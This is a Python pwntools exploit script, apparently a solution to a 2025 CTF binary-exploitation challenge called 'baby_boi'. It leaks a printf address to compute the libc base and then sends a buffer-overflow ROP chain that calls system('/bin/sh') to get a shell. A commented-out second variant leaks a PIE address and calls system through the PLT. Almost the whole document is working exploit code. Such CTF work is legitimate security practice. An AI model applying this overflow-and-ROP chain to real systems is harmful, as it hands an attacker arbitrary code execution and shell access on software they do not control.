'''
SOLUTION TO SIEBBER CTF 2025 BEARINGS CHECK
PIE bypass, ROP
'''

from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

elf = context.binary = ELF("./baby_boi")  # local copy
libc = ELF('./libc-2.27.so')  # local libc copy

target = process(env={"LD_PRELOAD":"./libc-2.27.so"})
pid, io_gdb = gdb.attach(target, api=True, gdbscript="c")

target.recvuntil(b"am: ")

printf_address = target.recvline().strip()
printf_address = int(printf_address, 16)
libc.address = printf_address - libc.sym.printf

offset = 0x28


# Gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address  # stack alignment
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

print(hex(pop_rdi))
print(hex(ret))
print(hex(binsh))
print(hex(system))


payload = flat(
    b'A' * offset,
    pop_rdi,
    binsh,
    system,
)


target.sendline(payload)
target.interactive()

'''
target.sendafter(b"> ", b"A" * 32)
target.send(b'\n')

target.recvuntil(b"A" * 32)
leak = target.recv(6)
leak = leak.ljust(8, b'\x00') 
leaked_main_pie = int.from_bytes(leak, 'little')
elf.address = leaked_main_pie - elf.sym.main #OR elf.symbols['main']

print(hex(elf.sym.main))
#io_gdb.execute(f"break *{hex(elf.sym.main)}")

pop_rdi = 0x000000000000119d #Pulled from disas (objdump)
ret = 0x0000000000001016

payload = flat(
    b"A" * 0x28,
    p64(elf.address + pop_rdi),
    p64(next(elf.search(b"/bin/sh\x00"))),
    p64(elf.address + ret) * 21,
    p64(elf.plt.system)

)


target.recvuntil(b"> ")
target.send(payload)
target.send(b'\n')
target.interactive()

'''